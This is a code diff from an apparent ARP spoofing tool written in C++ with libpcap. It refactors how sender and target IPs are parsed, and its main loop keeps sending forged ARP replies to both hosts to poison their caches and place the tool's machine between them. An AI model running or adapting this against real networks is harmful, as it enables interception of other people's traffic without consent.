@@ -79,11 +79,12 @@ uint8_t* queryMac(pcap_t* handle, uint8_t myMac[6], uint8_t myIp[4], uint8_t oth
     memcpy(newMac, arpHdr->smac, 6);
     return newMac;
 }
-
+/*
 uint8_t* queryMac(pcap_t* handle, uint8_t myMac[6], uint32_t myIp, uint32_t otherIp)
 {
     return queryMac(handle, myMac, reinterpret_cast<uint8_t*>(&myIp), reinterpret_cast<uint8_t*>(&otherIp));
 }
+*/
 
 int main(int argc, char** argv) {
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -93,8 +94,6 @@ int main(int argc, char** argv) {
     }
 
     auto dev = argv[1];
-    auto senderIp = argv[2];
-    auto targetIp = argv[3];
 
     struct ifreq myMacIfr, myIpIfr;
     int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
@@ -116,7 +115,7 @@ int main(int argc, char** argv) {
     }
     close(sock);
 
-    auto myIp = ((struct sockaddr_in*)&myIpIfr.ifr_addr)->sin_addr;
+    auto myIp = myIpIfr.ifr_addr;
 
 
     for(int i = 0; i < 6; ++i)
@@ -124,18 +123,16 @@ int main(int argc, char** argv) {
       std::printf("%02x:", (unsigned char)myMac[i]);
     }
     std::printf("\n");
-    printf("%s\n", inet_ntoa(myIp));
+    //printf("%s\n", inet_ntoa(myIp));
 
     std::cout << "sender: " << argv[2] << std::endl;
     std::cout << "target: " << argv[3] << std::endl;
 
-    struct sockaddr_in senderAddress;
-    inet_pton(AF_INET, argv[2], &senderAddress.sin_addr);
+    uint8_t senderIp[4];
+    Utils::fromIpString(argv[2], senderIp);
+    uint8_t targetIp[4];
+    Utils::fromIpString(argv[3], targetIp);
 
-
-    struct sockaddr_in targetAddress;
-    inet_pton(AF_INET, argv[3], &targetAddress.sin_addr);
-    
     pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
     if(handle == NULL)
     {
@@ -143,23 +140,23 @@ int main(int argc, char** argv) {
         return -1;
     }
 
-    auto senderMac = queryMac(handle, myMac, myIp.s_addr, senderAddress.sin_addr.s_addr);
-    auto targetMac = queryMac(handle, myMac, myIp.s_addr, targetAddress.sin_addr.s_addr);
+    auto senderMac = queryMac(handle, myMac, Utils::fromIpSockAddr(myIp), senderIp);
+    auto targetMac = queryMac(handle, myMac, Utils::fromIpSockAddr(myIp), targetIp);
     
     while(true) {
         ArpPacket::reply(
             handle,
             myMac,
-            Utils::fromIpSockAddr(senderAddress),
+            senderIp,
             targetMac,
-            Utils::fromIpSockAddr(targetAddress)
+            targetIp 
         );
         ArpPacket::reply(
             handle,
             myMac,
-            Utils::fromIpSockAddr(targetAddress),
+            targetIp,
             senderMac,
-            Utils::fromIpSockAddr(senderAddress)
+            senderIp
         );
     }
     delete senderMac;
